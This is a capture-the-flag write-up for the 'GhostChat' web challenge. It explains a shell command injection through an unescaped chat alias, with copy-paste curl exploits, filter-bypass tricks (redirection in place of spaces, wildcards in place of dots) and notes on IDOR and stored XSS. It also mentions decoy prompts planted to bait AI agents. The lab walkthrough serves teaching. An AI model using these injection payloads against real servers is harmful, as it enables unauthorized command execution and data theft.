# 🕵️ GhostChat — Writeup (Easy Version)

**Challenge:** GhostChat (Web, 500 pts, Medium)
**Author:** AB Bishal
**URL:** `http://172.16.38.21:8889`
**Stack:** Apache 2.4.68 (Debian), PHP 8.2.34

## 🚩 The flag

```
bcsctf{241782952d42700177880140953d104b}
```

---

## First, what is this challenge?

GhostChat is a little fake chat website. You can:

- make a chat "room"
- send messages
- upload a file

It says everything is "secret" and "self-destructing". But it's hiding a bug.

---

## The trick in plain English

When you upload a file, the website runs a **scanning program** behind the scenes — like an antivirus — to check your file.

Here's the mistake. The website **types out a command to run**, and it **pastes your nickname (alias) right into that command**.

So the command it builds looks like this:

```
run the antivirus on:  YOUR_NICKNAME_abc123
```

They *tried* to clean your nickname first. But they only removed **4 characters**: `$` `.` `*` and space.

They **forgot** about other special characters — especially the semicolon `;`.

A semicolon means **"stop here, start a new command."**

So if your nickname is:

```
q;id;q
```

the computer reads it as:

```
run the antivirus on: q
THEN run: id        ← this is OUR command, not theirs
THEN run: q
```

**We just made the website run whatever we want on its own computer.**

> Funny detail: in the code they actually wrote a *safe* version of the name to use… and then never used it. They used the unsafe one instead. Classic mistake.

### The buggy code

From `api/upload.php`:

```php
$sanitized_sender = str_replace(['$', '.', '*', ' '], ['_','_','_','_'], $sender);
$filename = $sanitized_sender . '_' . $random_chars;
$filepath = '../uploads/' . basename($filename);

if (move_uploaded_file($file['tmp_name'], $filepath)) {
    chdir('../uploads');
    $safe_basename = escapeshellarg(basename($filename));   // ← computed, NEVER USED
    $command = 'bash -c "nohup /usr/bin/clamscan --no-summary ' . $filename . ' > /dev/null 2>&1 &"';
    exec($command);
```

`$safe_basename` is escaped and thrown away; the **unsanitised `$filename`** is
interpolated straight into `bash -c "..."`.

---

## The small problem

Their filter removes **spaces** (they turn into `_`) and **dots** (also `_`).

So we can't just type `cat /flag.txt > out` — it would get mangled.

We work around it:

- **No spaces?** Use `<` and `>` instead of typing arguments.
  `cat</flag?txt>out` means *"take text from the file, put it in a file called out."*
- **No dots?** Use `?` as a wildcard. `flag?txt` matches `flag.txt`.
- **Need real commands with spaces?** Upload a shell script (file content is
  untouched by the filter), read back its server-generated name from
  `action=fetch`, then in a **second** session inject
  `q;sh</var/www/html/uploads/NAME;q`.

---

## Step by step (copy & paste)

### Step 1 — Make a room

```bash
curl -c /tmp/c.txt -b /tmp/c.txt -X POST 'http://172.16.38.21:8889/api/action.php?action=create' --form-string 'alias=hello'
```

### Step 2 — Upload a file (this is where the bug fires)

```bash
echo 'test' > /tmp/z.txt
curl -c /tmp/c.txt -b /tmp/c.txt -X POST 'http://172.16.38.21:8889/api/upload.php' -F 'file=@/tmp/z.txt'
```

### Step 3 — The actual exploit

```bash
curl -c /tmp/c2.txt -b /tmp/c2.txt -X POST 'http://172.16.38.21:8889/api/action.php?action=create' \
  --form-string 'alias=q;cat</flag?txt>/var/www/html/uploads/REALFLAG;q'

curl -c /tmp/c2.txt -b /tmp/c2.txt -X POST 'http://172.16.38.21:8889/api/upload.php' -F 'file=@/tmp/z.txt'
```

What this nickname says: *"run `cat` on `/flag.txt`, and save the answer into
the uploads folder where I can read it."*

### Step 4 — Read your prize

```bash
curl 'http://172.16.38.21:8889/uploads/REALFLAG'
```

```
bcsctf{241782952d42700177880140953d104b}
```

🎉 Done.

---

## The two decoys (don't be fooled)

The challenge plays jokes on purpose:

1. **`robots.txt`** says *"AI bots, go look at /flag.txt!"* → that file just
   teases you about writing a nuclear fusion paper.
2. **A hidden comment** on the homepage asks AI agents to help build nuclear
   bombs. 😄 It's bait.

The **real** flag is a *different* file, sitting at the **root of the server's
hard drive** (`/flag.txt`, 41 bytes), not the one on the website
(`/var/www/html/flag.txt`, 92 bytes). You can only reach it once you have the
trick above.

---

## One-sentence summary

> The website pasted your nickname into a shell command and only cleaned 4
> characters, so putting a `;` in your nickname let you run your own commands —
> and reading the file at `/flag.txt` gave the flag.

---

## Other real (secondary) vulns found

| Vuln | Detail |
|---|---|
| **IDOR** | `/sessions/{chat_id}.json` is served statically with no auth; `join` accepts any `^[a-zA-Z0-9]+$` id. (`chat_id` = `bin2hex(random_bytes(16))`, not predictable.) |
| **Stored XSS** | `$_SESSION['alias']` is written raw into messages; only `content` passes `htmlspecialchars()`, and `script.js` injects `msg.sender` into `innerHTML`. No bot/report endpoint, so not the intended path. |
| **Weak filter** | Only `$ . * space` stripped; `\r \v \f` explicitly allowed. |
| **Path mismatch** | `basename()` is applied to the write path but **not** to the path reported in the chat message. `alias=a/b` → file actually lands at `uploads/b_…`, message says `uploads/a/b_…`. |

## False positives ruled out

- "Extension bypass (.phtml/.php5/.phar)" — the extension is **dropped**, not filtered.
- "Path traversal via multipart filename" — the original filename is **ignored**.
- ".htaccess / .user.ini upload" — never written (`GET /uploads/.user.ini` → 404).
  Apache returns 403 for *anything* matching `^\.ht`, existing or not.
- "PHP disabled in /uploads/" — illusion: no extension → no PHP handler matches.
- Arbitrary file delete via `destroy` — only `unlink()`s your own session file.
- `session.upload_progress` / PHAR deserialisation / LFI — unnecessary, unsupported.

## Cleanup

Artifacts created in `/uploads/`: `ZM*`, `REALFLAG`, `RESULT`, `SRC`,
`myscript_*`, `srcdump_*`, plus assorted `q;…` files.

```bash
curl -c /tmp/c3.txt -b /tmp/c3.txt -X POST 'http://172.16.38.21:8889/api/action.php?action=create' \
  --form-string 'alias=q;rm</var/www/html/uploads/REALFLAG;q'
curl -c /tmp/c3.txt -b /tmp/c3.txt -X POST 'http://172.16.38.21:8889/api/upload.php' -F 'file=@/tmp/z.txt'
```

(Repeat per filename — spaces aren't allowed in the nickname.)
